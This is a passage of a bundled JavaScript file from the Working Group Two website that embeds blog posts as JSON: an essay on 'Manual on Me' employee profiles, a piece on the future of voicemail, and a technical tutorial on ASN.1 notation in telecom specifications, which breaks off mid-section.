"use strict";(self.webpackChunkworking_group_two_website=self.webpackChunkworking_group_two_website||[]).push([[1477],{10:function(e){e.exports=JSON.parse('{"blogPosts":[{"id":"manual-on-me-matt-long","metadata":{"permalink":"/blog/manual-on-me-matt-long","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-02-08-manual-on-me-matt-long/index.md","source":"@site/../blog/2022-02-08-manual-on-me-matt-long/index.md","title":"Manual on Me: Matt Long","description":"As I was waking up this morning, I started surfing Reddit.  One post, in particular, jumped out at me.  In this post, the writer (OP in Reddit parlance) had been asked to take a personality test at work by a new supervisor.   The OP was asking if this was something they should agree to do.","date":"2022-02-08T00:00:00.000Z","formattedDate":"February 8, 2022","tags":[{"label":"trust","permalink":"/blog/tags/trust"},{"label":"culture","permalink":"/blog/tags/culture"},{"label":"startup","permalink":"/blog/tags/startup"},{"label":"manual-on-me","permalink":"/blog/tags/manual-on-me"}],"readingTime":5.425,"truncated":true,"authors":[{"name":"Matt Long","title":"Engineering Manager for Edge, Cloud and Security","url":"https://www.linkedin.com/in/mattlong/","imageURL":"/img/author-photos/mtl-li.jpg","key":"mtl"}],"frontMatter":{"slug":"manual-on-me-matt-long","title":"Manual on Me: Matt Long","date":"2022-02-08T00:00:00.000Z","tags":["trust","culture","startup","manual-on-me"],"authors":["mtl"]},"nextItem":{"title":"Don\'t leave a message after the beep","permalink":"/blog/please-dont-leave-a-message-after-the-beep"}},"content":"As I was waking up this morning, I started surfing Reddit.  One post, in particular, jumped out at me.  In this post, the writer (OP in Reddit parlance) had been asked to take a personality test at work by a new supervisor.   The OP was asking if this was something they should agree to do.\\n\\nThe responses varied.  Some were mildly positive, but most were very cynical since this sort of testing can be misused by bad management.  However, this got me thinking and, eventually, writing this post.\\n\\n\x3c!-- truncate --\x3e\\n\\nLet\'s look at the supervisor mentioned on Reddit and view their actions in a charitable light.  It is entirely probable that they only wanted to better understand and work with their new direct reports.  This is undoubtedly great!  However, a personality test is not a particularly useful tool for this -- people are too varied, and lives are too complicated.  This [interview](https://knowledge.wharton.upenn.edu/article/the-science-of-personality-understanding-yourself-and-those-around-you/) with Brian Little, the author of \\"Me, Myself and Us: The Science of Personality and the Art of Well-Being,\\" discusses some of the problems with these sorts of assessments.\\n\\nAnd as an employee, who wants a supervisor that uses an impersonal online test to figure out the best way to work with someone?\\n\\n## Our Process\\n\\nAt [Working Group Two](https://www.wgtwo.com), we do things a little bit differently.  We follow a straightforward process of [treating employees like grownups](https://www.wgtwo.com/blog/were-all-grownups-here/).  I thought it might be worth talking about how we handle the \\"let\'s try to understand our employees\\" problem and share a public version of what I have shared inside the company.\\n\\nThe short answer to this is this: just ask.  Amazing!\\n\\nWhen new employees start working with us, we ask them to fill out a \\"Manual on Me.\\" Since we are a distributed company and everyone is _de-facto_ remote, this manual serves two purposes: it is a bit of an icebreaker and a powerful communication tool.  Everyone in the company has a \\"Manual on Me,\\" from the CEO and CTO to the most recent new hire.\\n\\nAs Professor Little notes: \\"Once you understand what a person\'s core projects are or even ask a person, \'How is it going, David?,\' it puts us in a position where we can actually treat humans as humans.  That to me is going to pay enormous benefits in the long term.\\"\\n\\nHere\'s what I was asked to put into _my_ manual:\\n* What I know about that people can ask me\\n* How I think about things\\n* Common mistakes I make in my interactions with others\\n* My expectations from others\\n* What frustrates me\\n* How to reach out and get in touch with me\\n* How to give me feedback\\n\\nAlthough nobody in the company remembers how this practice actually started, this is not a completely new idea.  I see that there are a few references to this concept around the internet, including at least one [online version](https://www.manualof.me).  Their [about page](https://www.manualof.me/about) cites a few previous inspirations and sources for this \\"personal user manual.\\"\\n\\nSo how does this solve the problem on Reddit?  Assuming the OP\'s new supervisor really wanted to know their employees, they could *just ask* and probably find out just as much (or more) than having everyone take the MBTI.\\n\\n## My \\"Manual on Me\\"\\n\\nSo what does my \\"Manual on Me\\" look like?  Here is what I wrote in the summer of 2018:\\n\\n:::note Manual on Me\\n\\n![](./mtl-grayscale.png)\\n\\n**What I know something about:**\\n- I know a little bit about a lot of things.\\n- Recently, I\'ve been doing a lot of cloud infrastructure work, so that is freshest in my mind.\\n- I\'ve also had experience with development of embedded Java VMs, garbage collection, graphics drivers, distributed workflow systems, robotics, AI, machine learning, and autonomous ships.\\n\\n**How I think about things:**\\n- I like to challenge how things are done and find simpler solutions.  This often involves understanding why things are currently done the way they are.\\n- I very much like to think about an end goal and develop solutions _towards_ the goal.\\n- While I like to think a little about the steps in the middle, I don\'t like planning them in great detail.\\n\\n**Common mistakes I make in my interaction with you:**\\n- Sometimes, I will offer possibilities and suggestions as a way of discussion -- sort of like the \\"rubber duck\\" development process.  This is not _meant_ as a negative criticism but intended to continue the conversation and explore possibilities.  But I do understand how it can be interpreted in other ways.  Let me know if this is annoying!\\n\\n**My expectations to you:**\\n- I expect people to try, experiment, and learn.\\n- I also hope that everyone feels comfortable speaking up and expressing their point of view and ideas.\\n- If something is not clear, ask for clarification.\\n\\n**What frustrates me:**\\n- Bureaucracy, particularly rules that exist without an explanation of why the rule exists.\\n- Broken software systems.  When tied with bureaucracy, these are often known as \\"Enterprise software.\\"\\n\\n**How to reach out to me:**\\n- I prefer asynchronous messaging\\n\\t- Work Slack is absolutely the easiest way to reach me\\n\\t- SMS is second-best\\n- Voice is also fine as long as it is a reasonable time or arranged through one of the async methods.\\n\\n**How to give me feedback:**\\n- I like feedback, and direct, actionable feedback is fantastic!\\n- If it is serious, I like to have time to digest the feedback before I need to give a response, if possible.\\n\\n:::\\n\\nMost of this is still true, but maybe it is time for an update!\\n\\n## A management perspective\\n\\nAs a manager who likes to make sure my team is happy and enjoying their work (to the extent that I can do so), I really like these.\\n\\nWhen talking to new colleagues, I have a great way to start conversations (\\"So, where have you been climbing recently?\\", \\"How\'re the corona regulations in Canada these days?\\", \\"What type of photography do you like to do?\\").\\n\\nThey also help with giving and receiving feedback.  Should I drop a note into Slack, then set up a video meeting?  How blunt should I be?  Should I expect to talk about the feedback immediately or schedule a follow-up meeting after they (or I) have had a chance to think?\\n\\nBut most importantly, we feel that the \\"Manual on Me\\" is a respectful, adult way to communicate preferences without trying to pigeonhole everyone into one of sixteen types."},{"id":"please-dont-leave-a-message-after-the-beep","metadata":{"permalink":"/blog/please-dont-leave-a-message-after-the-beep","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-02-04-please-dont-leave-your-message-after-the-beep.md","source":"@site/../blog/2022-02-04-please-dont-leave-your-message-after-the-beep.md","title":"Don\'t leave a message after the beep","description":"Think quickly: When was the last time you dialed into your voicemail to listen to a message someone had left for you? Chances are, it\u2019s been a while. The common view is that voicemail isn\u2019t popular any longer. That\u2019s both true and not true, depending on how you look at it. Find out where voicemail - loved by some and hated by others - is heading.","date":"2022-02-04T00:00:00.000Z","formattedDate":"February 4, 2022","tags":[{"label":"messaging","permalink":"/blog/tags/messaging"},{"label":"voicemail","permalink":"/blog/tags/voicemail"},{"label":"api","permalink":"/blog/tags/api"}],"readingTime":5.28,"truncated":true,"authors":[{"name":"Tor Odland","title":"Head of Marketing","url":"https://www.linkedin.com/in/torodland/","imageURL":"https://media-exp1.licdn.com/dms/image/C4D03AQEgj3-fVz-pYQ/profile-displayphoto-shrink_200_200/0/1575228382184?e=1649289600&v=beta&t=0sJfNa93C4MTEp0KNXsguLmbAgej0id0XJx7Li6ZN9Q","key":"tor-odland"}],"frontMatter":{"slug":"please-dont-leave-a-message-after-the-beep","title":"Don\'t leave a message after the beep","date":"2022-02-04T00:00:00.000Z","tags":["messaging","voicemail","api"],"authors":["tor-odland"]},"prevItem":{"title":"Manual on Me: Matt Long","permalink":"/blog/manual-on-me-matt-long"},"nextItem":{"title":"The specs behind the specs part 1","permalink":"/blog/the-specs-behind-the-specs-part-1"}},"content":"Think quickly: When was the last time you dialed into your voicemail to listen to a message someone had left for you? Chances are, it\u2019s been a while. The common view is that voicemail isn\u2019t popular any longer. That\u2019s both true and not true, depending on how you look at it. Find out where voicemail - loved by some and hated by others - is heading.\\n\\n\x3c!--truncate--\x3e\\n\\n\u201cPlease leave your message after the beep\u201d - you\u2019ve probably heard it a million times, especially if you were born before 1982. Or you\u2019ve repeated that sentence over and over as you tried to make an attractive recording of your own voice as your greeting to a missed caller. We knew it wasn\u2019t necessary to say it (people knew what to do after the beep) but we still recorded it that way. Probably because we didn\u2019t know what else to say.\\n\\nFor many of us, those days are over. We just don\u2019t bother with setting up our voicemails, we never leave voicemails and we certainly never dial up to listen to a message someone left for us. For my own part, I don\u2019t even know if people who call me get to a voicemail system.\\n\\nTo others, voicemail is really crucial.\\n\\n> \u201cWe see the importance of voicemail increasing or declining based on specific demographics,\u201d says Luke Campbell, the CEO of [Vxt](https://www.vxt.co.nz), a communications technology company in New Zealand.\\n\\nLuke describes people working in transactional industries as particularly passionate about voicemail. Lawyers, real estate agents, plumbers - they might get dozens of calls every day. So where others turn off voicemail, these people might want to get their voicemails forwarded to their emails, be able to share their inbox with a colleague or assistant, have voicemails automatically translated to text and integrate their messages with productivity tools like Asana or an ERP system. Some need to have their messages stored for regulatory or security purposes. A real estate agent with (say) 10 000 contacts may want to customize the greetings so that every time one of the 200 Johns or Jessicas call, they get a personal message stating their name. To some, that might be a differentiator, to others a nuisance.\\n\\nBesides, Luke tells me, how dying is voicemail really, when in New Zealand, there are two million voicemails left every day, in a population of 4,6 million?\\n\\n### A vocal assistant\\n\\nKarel Bourgois paints a similar picture. He\u2019s the CEO of [Voxist](https://www.voxist.com), a voicemail and messaging app, based in France. He\u2019s seen voicemail transform into more of a productivity tool for businesses. Young people might still play around with things like customizing their voicemail greetings to individual callers, but in general, they don\u2019t like talking.\\n\\n<img src=\\"/img/blog/voicemail.jpeg\\" alt=\\"Breaking up via voicemail\\" width=\\"300\\"/>\\n\\n> \u201cI see voicemail becoming more like a vocal assistant. A restaurant, for example, can let patrons reserve tables directly into the booking system just using their voices. A law firm or a bank can integrate voicemail with their CRM systems. A big movement now is to move voice messaging into core automation,\u201d Karel says.\\n\\nSo voicemail systems continue to evolve. Users either don\u2019t want voicemail or they want a voicemail service that can travel with them across devices, operators and national borders.\\n\\nTo Luke Campbell, the very challenge of requiring people dial into a voicemail service and listen to a bunch of commands before you get to your messages was in itself a problem big enough to be solved for kickstarting his business. Vxt started as a voice messaging service and today has evolved into a communication automation company, echoing Karel\u2019s observations.\\n\\n### The routes you can go down\\n\\nIf you want to improve the voicemail experience, one route you can go down is to add more features, to make it more flexible and powerful.\\n\\nAnother route is to make the user experience simpler. To make it easier and faster to listen to voicemail.\\n\\nThat\u2019s essentially what Working Group Two and the Swedish mobile operator challenger [Vimla](https://vimla.se) did. In response to a regulatory challenge by the Swedish Post & Telecom Authority (PTS), Vimla recently launched a voicemail service where messages get delivered to a user\u2019s phone as an audio file (via MMS). The customer can listen to it whenever he/she wants without needing to dial into the messaging system. As a result, hackers can no longer get access to other people\u2019s voicemails (which PTS had set out to stop) and customers get a better messaging experience.\\n\\nThis simple, yet elegant solution serves as a powerful example of another and more fundamental development in the telecom industry. For a few years, Working Group Two has developed and managed the mobile core network of Vimla as-a-service in the cloud, enabling Vimla to operate its network both more efficiently and taking advantage of micro innovation at scale. When this challenge came around from PTS it took Vimla only a few months to respond with this lightweight and efficient solution. Working Group Two\u2019s developers used existing APIs to connect two otherwise separate systems (voicemail and MMS). The API-based bridge between them allowed voicemails to be sent as MMS. Today, tens of thousands messages are sent every day in the Vimla network.\\n\\n> \u201cWe genuinely think this is a better product for our customers,\u201d says Viktor Georgsson, Head of Operations with Vimla.\\n\\nOther operators in Sweden responded to the PTS requirements by beefing up their security systems and protecting voicemail inboxes with longer authentication codes and more rigorous encryption. Perhaps at the expense of the customer experience.\\n\\n### Ask yourself four questions...\\n\\nAt the end of the day, voicemail must face the test of any other digital product, says Marius Waldum, the Head of Product at Working Group Two. He\u2019s in charge of the effort of developing the company\u2019s ecosystem platform - where third party digital products are developed to run and meet users across multiple operators worldwide. Working Group Two has developed a standardized voicemail product called Voicebox, from which Vimla\u2019s solution took its inspiration.\\n\\nYou need to ask yourself four questions, Marius points out. First, is the product **valuable** to its users? Is it **usable** for them? Is it **possible to build**? And is it **economically viable**?\\n\\n> \u201cVoicemail is a powerful reminder that a product doesn\u2019t need to be desired by everyone, but by someone,\u201d Marius concludes."},{"id":"the-specs-behind-the-specs-part-1","metadata":{"permalink":"/blog/the-specs-behind-the-specs-part-1","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-01-11-the-spec-behind-the-specs.md","source":"@site/../blog/2022-01-11-the-spec-behind-the-specs.md","title":"The specs behind the specs part 1","description":"\\"Abstract Syntax Notation One (ASN.1) is a standard interface","date":"2022-01-11T00:00:00.000Z","formattedDate":"January 11, 2022","tags":[{"label":"telco","permalink":"/blog/tags/telco"},{"label":"ASN.1","permalink":"/blog/tags/asn-1"},{"label":"dia","permalink":"/blog/tags/dia"}],"readingTime":31.02,"truncated":true,"authors":[{"name":"Sebastian Weddmark Olsson","title":"Software Engineer @ wgtwo","url":"https://www.linkedin.com/in/sebastian-weddmark-olsson/","imageURL":"https://media-exp1.licdn.com/dms/image/C5603AQGKBPb8-fRQrw/profile-displayphoto-shrink_400_400/0/1552936055035?e=1648684800&v=beta&t=Um5M-sEowAYCYIc3uW4aXlzDM7pQSbK1SIEEJPcJD2M","key":"seba"}],"frontMatter":{"slug":"the-specs-behind-the-specs-part-1","title":"The specs behind the specs part 1","date":"2022-01-11T00:00:00.000Z","tags":["telco","ASN.1","dia"],"authors":"seba"},"prevItem":{"title":"Don\'t leave a message after the beep","permalink":"/blog/please-dont-leave-a-message-after-the-beep"},"nextItem":{"title":"Zero-day vulnerabilities - Log4j","permalink":"/blog/log4j-security-vulnerability"}},"content":"\\"Abstract Syntax Notation One (ASN.1) is a standard interface\\ndescription language for defining data structures that can be\\nserialized and deserialized in a cross-platform way.\\" -\\n[Wikipedia](https://en.wikipedia.org/wiki/ASN.1)\\n\\n\x3c!--truncate--\x3e\\n# Introduction\\n\\nToday you\'ll read about a specific language used to describe many of\\nthe messages in the telecom specifications. It will be a deep-dive\\ninto technical parts, so I imagine you could just use the blog post\\nwhen you want to look up different parts without fully reading it.\\n\\nIn **wgtwo** we use this language for some specific telco\\nmessages (such as SIGTRAN layers TCAP/MAP/CAP, as well as S1AP, NGAP\\nand probably some more). They are defined directly in some of the\\ntelecom specifications, and because of that it is possible to use them\\nto send messages between different telecom cores.\\n\\nThis will *probably* be a two piece blog post as there is another\\ninterface describing language which is not ASN.1, and this is already\\na very long post. The other specification is used in Diameter\\ndictionaries, but I\'ll spare those for now. It has already taken me\\nabout half a year to finish up this article.\\n\\nThere might be some Erlang specific paragraphs here and there, but\\nthis blog post is mainly about ASN.1 as a specification, which can be\\nused in any language supporting it.  For Erlang specifics I came\\nacross [this blog\\npost](https://medium.com/erlang-battleground/erlang-asn-1-abstract-syntax-notation-one-deeb8300f479)\\nwritten by Viacheslav Katsuba, and because it is build into Erlang by\\ndefault I recommend the\\n[APIs](https://www.erlang.org/doc/apps/asn1/asn1_getting_started.html)\\nas well.\\n\\n**DISCLAIMER: SEVERE HEADACHE MIGHT FOLLOW.**\\n\\n# Abstract Syntax Notation One\\n\\nAbstract Syntax Notation One (ASN.1 for short) provides a\\nhigh level description of messages. It abstracts the language\\nimplementations from the protocol design.\\n\\nIt was initially used by [Open Systems Interconnection\\n(OSI)](https://en.wikipedia.org/wiki/Open_Systems_Interconnection) to\\ndescribe email messages but is used by many other applications\\nespecially within telecommunications and cryptography.\\n\\nYou might have heard of similar such abstract syntax notations used\\nfor interface definitions such as Google Protocol Buffers, or\\nFacebook\'s Apache Thrift, but those languages have not been managed by\\na standardization organization, so the owning corporations could (in\\ntheory) make breaking changes or change the license or even remove the\\nlanguage definitions overnight.\\n\\nAnyway, back to ASN.1\\n\\nThe first ASN.1 standardization came out 1984, and there have been\\nmany improvements since, for instance with the 1994 update which added\\nextended functionality for telecommunication technologies.\\n\\n\\"Long live ASN.1!\\" - Olivier Dubuisson from the [best\\nbook](https://www.oss.com/asn1/resources/books-whitepapers-pubs/asn1-books.html#dubuisson)\\nthat I\'ve read on the subject. (How many ASN.1 books are there you\\nmight wonder? Actually there were [more\\nbooks](https://www.oss.com/asn1/resources/books-whitepapers-pubs/asn1-books.html)\\nthan I expected on the subject, but to make it perfectly clear: I did\\nonly read the one.)\\n\\nOff-topic but a bit of a fun fact I got from reading the book which I\\ndidn\'t know about before is that \'little Endian\' and \'big Endian\',\\nwhich are used to denote if the bitstring should be read from leftmost\\nor rightmost bit, actually originates from the 1726 best-seller\\n[Gulliver\'s\\ntravels](https://www.ling.upenn.edu/courses/Spring_2003/ling538/Lecnotes/ADfn1.htm).\\n\\n## The how and why\\n\\nASN.1 builds on the following ideas:\\n\\n- Data structures to be transmitted should be described regardless of\\n  programming language used transmitting or receiving them.\\n- The notation should allow building complex data types from basic\\n  types, and be able to do so recursively.\\n- The notation must be formal to prevent ambiguities.\\n\\nThat said, ASN.1 is not an abstract syntax in itself, but a language\\nto describe abstract syntaxes.\\n\\nThere are currently four main ASN.1 specifications (listed below), as\\nwell as at least one specification per encoding rule (listed in the\\n[last section](#encodings)).\\n\\n\\n| ITU-T no                                                                               | ASN.1 specifications                                                           |\\n| -------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ |\\n| [X.680](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.680) | Abstract Syntax Notation One (ASN.1): Specification of basic notation          |\\n| [X.681](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.681) | Abstract Syntax Notation One (ASN.1): Information object specification         |\\n| [X.682](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.682) | Abstract Syntax Notation One (ASN.1): Constraint specification                 |\\n| [X.683](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.683) | Abstract Syntax Notation One (ASN.1): Parameterization of ASN.1 specifications |\\n\\n\\n# Nitty gritty\\n\\n## Modules\\n\\nThe purpose of an ASN.1 module is to name a collection of types and/or\\nvalue definitions.\\n\\nIt consist of a module reference and an optional object identifier\\ntogether with the declaration of the `DEFINITIONS` type definition.\\nNote that even though the object identifier is optional, it is\\nconsidered bad practice to leave it out. The reason for it being\\noptional is for backward compatibility; it was not part of the\\noriginal ASN.1 specification.\\nThe `DEFINITIONS` keyword usually comes together with the `BEGIN` and\\n`END` keywords so multiple definitions can be done. (What else is the\\npoint of a module if not to make a collection...).\\n\\nThe Erlang ASN.1 compiler requires each module to be in a separate\\nfile, but generally one ASN.1 file could contain many modules.  Usual\\nfile endings are `.asn` and `.asn1`. One\\n[trick](https://www.erlang.org/doc/apps/asn1/asn1_getting_started.html#multi-file-compilation)\\nthat can be used to circumvent this Erlang specific problem is to list\\nmultiple ASN.1 files in a new file ending with `set.asn`.\\n\\nOne example of a file with many modules exist in the CAP specification\\n[3GPP TS 29.078](https://portal.3gpp.org/desktopmodules/Specifications/SpecificationDetails.aspx?specificationId=1597)\\n\\nThe ASN.1 template for a module\\n```asn.1\\nModuleReference ObjectIdentifier\\nDEFINITIONS ::= BEGIN\\n\\nEND\\n```\\nas seen in an example\\n\\n```asn.1\\nCAP-operationcodes {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0) umts-network(1)\\nmodules(3) cap-operationcodes(53) version8(7)}\\n\\nDEFINITIONS ::= BEGIN\\n```\\n\\nFor information about the object identifier see the [types section](#object-identifier)\\n\\n### Importing from other modules\\n\\nImporting types, values and other structures from other modules can be\\ndone with the `IMPORTS` and `FROM` keywords in the beginning of the\\nmodule body.  The `IMPORTS` keyword ends with a single semicolon `;`,\\nand the different imported definitions are comma-separated.\\n\\nThe meaning of the optional `IMPLICIT TAGS` keywords I\'ll handle\\n[later](#automatic-implicit-explicit-tags).\\n\\n```asn.1\\nCAP-datatypes {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0) umts-network(1) modules(3) cap-datatypes(52) version8(7)}\\nDEFINITIONS IMPLICIT TAGS ::= BEGIN\\n\\nIMPORTS\\n\\n\\tDuration,\\n\\tInteger4,\\n\\tInterval,\\n\\tLegID,\\n\\tServiceKey\\nFROM CS1-DataTypes {itu-t(0) identified-organization(4) etsi(0) inDomain(1) in-network(1)\\nmodules(0) cs1-datatypes(2) version1(0)}\\n\\n\\tBothwayThroughConnectionInd,\\n\\tCriticalityType,\\n\\tMiscCallInfo\\nFROM CS2-datatypes {itu-t(0) identified-organization(4) etsi(0) inDomain(1) in-network(1)\\ncs2(20) modules(0) in-cs2-datatypes(0) version1(0)}\\n\\n-- ...more imports...\\n; -- IMPORTS end here\\n\\nEND -- CAP-datatypes ends here --\\n\\n-- CAP-errortypes module starts here --\\nCAP-errortypes {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0) umts-network(1) modules(3) cap-errortypes(51) version8(7)}\\nDEFINITIONS IMPLICIT TAGS ::= BEGIN\\n\\n\\nEND -- CAP-errortypes ends here --\\n```\\n\\nThe type definitions `Duration` and `LegID` above are imported from\\n`CS1-DataTypes` module, while `MiscCallInfo` comes from\\nthe `CS2-datatypes` module.\\n\\n### Exporting from a module\\n\\nExports from a module are done in a similar fashion.\\n\\nIf the `EXPORT` keyword is not used in a module, the ASN.1 compilers\\nshould export all values and types from the module. It\'s the same as\\nspecifying `EXPORTS ALL;`.\\n\\n```asn.1\\nCAP-GPRS-ReferenceNumber {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0)\\numts-network(1) modules(3) cap-dialogueInformation(111) version8(7)}\\n\\nDEFINITIONS ::= BEGIN\\n\\nEXPORTS\\n\\tid-CAP-GPRS-ReferenceNumber,\\n\\tcAP-GPRS-ReferenceNumber-Abstract-Syntax;\\n\\nIMPORTS\\n\\n\\tInteger4\\nFROM CS1-DataTypes {itu-t(0) identified-organization(4) etsi(0) inDomain(1) in-network(1)\\nmodules(0) cs1-datatypes(2) version1(0)}\\n;\\n\\nEND\\n```\\n\\n### Commenting\\n\\nAs can be seen in the above example one can enter comments into the\\nASN.1.  Comments starts with double dash `--` and ends with either a\\nnewline or another `--`, whichever comes first.\\n\\n## Assignments and naming\\n\\nThe rules specify that type references must start with an uppercase\\nletter and may not end with a dash `-`. It may also only contain\\nupper- and lower-case letters, digits or dashes `-`.  The syntax for a\\ntype assignment is\\n\\n```asn.1\\nTypeRef ::= TypeDefinition\\n```\\n\\nFor instance\\n```asn.1\\nInvokeIdType ::= INTEGER (-128..127)\\n\\nCancelArg ::= CHOICE {\\n    invokeID        [0] InvokeID,\\n    allRequests     [1] NULL\\n}\\n\\nDuration ::= INTEGER (-2..86400)\\n\\nInteger4 ::= INTEGER (0..2147483647)\\n\\nInterval ::= INTEGER (-1..60000)\\n\\nInvokeID ::= InvokeIdType\\n\\nLegID ::= CHOICE {\\n    sendingSideID   [0] LegType,\\n    -- used in operations sent from SCF to SSF\\n    receivingSideID [1] LegType\\n    -- used in operations sent from SSF to SCF\\n}\\n\\nLegType ::= OCTET STRING (SIZE(1))\\n\\nServiceKey ::= Integer4\\n```\\n\\nValue references have a similar syntax as type references except that\\nvalue references must start with a lower-case letter, and also carry\\nthe values type.\\n\\nSyntax\\n```asn.1\\nvalueRef Type ::= value\\n```\\n\\nFor example\\n```asn.1\\nleg1 LegType ::= \'01\'H\\nleg2 LegType ::= \'02\'H\\n\\nhighLayerCompatibilityLength            INTEGER ::= 2\\nminAChBillingChargingLength             INTEGER ::= 0\\n```\\n\\n# Types\\n\\nNow when we have talked a bit about naming references, and how to\\nassign values and types I\'ll go over which built-in types exist, and\\nhow to create new types.\\n\\nThere are some common types, each consists of a type reference and a\\ntag number.  The tag number is used to identify it when sending the\\ntype in the network.  The universal tags are specified in [ITU-T\\nX.680](https://www.itu.int/rec/T-REC-X.680/en)\\n\\nHere is a list of the most common types\\n\\n| Type                                    | Universal Tag Number |\\n| --------------------------------------- | -------------------- |\\n| [BOOLEAN](#boolean)                     | 1                    |\\n| [INTEGER](#integer)                     | 2                    |\\n| [BIT STRING](#bit-string)               | 3                    |\\n| [OCTET STRING](#octet-string)           | 4                    |\\n| [NULL](#null)                           | 5                    |\\n| [OBJECT IDENTIFIER](#object-identifier) | 6                    |\\n| [EXTERNAL](#external)                   | 8                    |\\n| [REAL](#real)                           | 9                    |\\n| [ENUMERATED](#enumerated)               | 10                   |\\n| [UTF8String](#string-types)             | 12                   |\\n| [TIME](#time-types)                     | 14                   |\\n| [SEQUENCE (OF)](#sequence-of)           | 16                   |\\n| [SET (OF)](#set-of)                     | 17                   |\\n| [NumericString](#string-types)          | 18                   |\\n| [IA5String](#string-types)              | 22                   |\\n| [UTCTime](#time-types)                  | 23                   |\\n| [GeneralizedTime](#time-types)          | 24                   |\\n| [VisibleString](#string-types)          | 26                   |\\n| [DATE](#time-types)                     | 31                   |\\n| [TIME-OF-DAY](#time-types)              | 32                   |\\n| [DATE-TIME](#time-types)                | 33                   |\\n| [DURATION](#time-types)                 | 34                   |\\n|                                         |                      |\\n| [CHOICE](#choice)                       | *                    |\\n| [SELECTION](#selection)                 | *                    |\\n\\n\\nThe common types can be divided into simple and structured types.\\nStructured types are the composition of multiple types (so called\\ncomponent types) using one of the following types and keywords\\n`SEQUENCE`, `SEQUENCE OF`, `SET`, `SET OF`, `CHOICE`, and/or\\n`SELECTION`.  Note that `CHOICE` and `SELECTION` does not [need to]\\nhave their own universal tags, due to those are consisting of other\\ntypes.\\n\\n## Basic types\\n\\n### BOOLEAN\\n\\nThe `BOOLEAN` type takes values `TRUE` or `FALSE`.\\n\\n```asn.1\\nAudibleIndicator ::= CHOICE {\\n    tone       BOOLEAN,\\n    burstList  [1] BurstList\\n}\\n\\n```\\n\\nHere the value `tone` of the composit type `AudibleIndicator` is of\\ntype `BOOLEAN`. Note: It was one of the cleanest example I could find\\nof a `BOOLEAN` in the ASN.1 files we use, because Telco often use a\\nspecial \\"trick\\" when it comes to booleans in order to save bandwidth,\\ni.e. the `NULL` type.\\n\\n### NULL\\n\\nThe `NULL` type is basically a placeholder, where the recognition of a\\nvalue is important but the actual value is not.\\n\\nIn 3GPP it is similar to `BOOLEAN` in the sense that a defined `NULL`\\nvalue is considered `TRUE` and if the value is missing it is\\nconsidered `FALSE`. The reason for this is that when sent over the\\nnetwork with [BER encoding](#encodings), it will take no space because\\n`BOOLEAN` is always of length 1 but `NULL` is always length 0,\\ni.e. `NULL` does not contain a value.\\n\\n```asn.1\\nCancelArg {PARAMETERS-BOUND : bound} ::= CHOICE {\\n    invokeID            [0] InvokeID,\\n    allRequests         [1] NULL,\\n    callSegmentToCancel [2] CallSegmentToCancel {bound}\\n}\\n```\\n\\nin this example `allRequests` can be defined (then only the tag is\\ntransmitted) or not at all.\\n\\n### INTEGER\\n\\n`INTEGER` takes any of the infinite set of integer values. It can also\\nhave the additional notation that names some of the values.\\n\\n\\n```asn.1\\nGSMMAPOperationLocalvalue ::= INTEGER{\\n    updateLocation (2),\\n    cancelLocation (3),\\n    provideRoamingNumber (4),\\n    noteSubscriberDataModified (5),\\n    resumeCallHandling (6),\\n    insertSubscriberData (7),\\n    -- rest of the named integers --\\n}\\n```\\n\\n```asn.1\\nlocalvalue1 GSMMAPOperationLocalvalue ::= updateLocation\\nlocalvalue2 GSMMAPOperationLocalvalue ::= 2\\nlocalvalue3 GSMMAPOperationLocalvalue ::= -55413459\\n```\\nare all valid `GSMMAPOperationLocalvalue`s.\\n\\n### ENUMERATED\\n\\n`ENUMERATED` has the same interpretation as `INTEGER` but will hold\\nspecific values only.\\n\\n\\n```asn.1\\nRequestedInformationType ::= ENUMERATED {\\n    callAttemptElapsedTime(0),\\n    callStopTime(1),\\n    callConnectedElapsedTime(2),\\n    calledAddress(3),\\n    releaseCause(30)\\n}\\n```\\n\\n```asn.1\\nreqInfoType1 RequestedInformationType ::= callAttemptElapsedTime\\nreqInfoType2 RequestedInformationType ::= 0\\n```\\n\\nare both valid values of `RequestInformationType`, while this is not:\\n\\n```asn.1\\nnotValidReqInfoType RequestedInformationType ::= 4\\n```\\n\\n### BIT STRING\\n\\n`BIT STRING` takes values that are a sequence of zero or more bits. It\\ncan also take an additional notation that name certain bits in the bit\\nsequence.\\n\\n```asn.1\\nDeferredLocationEventType ::= BIT STRING {\\n    msAvailable (0) ,\\n    enteringIntoArea (1),\\n    leavingFromArea (2),\\n    beingInsideArea (3) ,\\n    periodicLDR (4)\\n} (SIZE (1..16))\\n```\\n\\n```asn.1\\neventType1 DeferredLocationEventType ::= (msAvailable, beingInsideArea)\\neventType2 DeferredLocationEventType ::= \'10010\'B\\neventType3 DeferredLocationEventType ::= \'12\'H\\n```\\n\\nare all valid value definitions of the same bit sequence where the\\nfirst and third bits are set, and no other bits are set.  The `B` stands\\nfor binary representation and `H` for hexadecimal representation.\\n\\nThe `SIZE` is a constraint on the type defining it to be of a specific\\nlength. This keyword comes as an extra notation for many of the\\n`STRING` types below (as well as some of the other types).\\n\\n### OCTET STRING\\n\\nType `OCTET STRING` takes values that are an ordered sequence of zero\\nor more (eight-bit) octets.\\n\\n```asn.1\\nMM-Code ::= OCTET STRING (SIZE (1))\\n```\\n\\nIn the same manner as `BIT STRING` both values below are valid\\ninstances of `MM-Code`:\\n\\n```asn.1\\niMSI-Attach1 MM-Code ::= \'00000010\'B\\niMSI-Attach2 MM-Code ::= \'02\'H\\n```\\n\\nwhile\\n\\n```asn.1\\nnotValidIMSI-Attach MM-Code ::= \'10010\'B\\n```\\n\\nis not considered a valid value due to it not being a multiple of eight bits.\\n\\n### OBJECT IDENTIFIER\\n\\nThe `OBJECT IDENTIFIER` type (shortened `OID`) names information\\nobjects such as ASN.1 modules. The named information object is a node\\non an object identifier tree that is managed at the 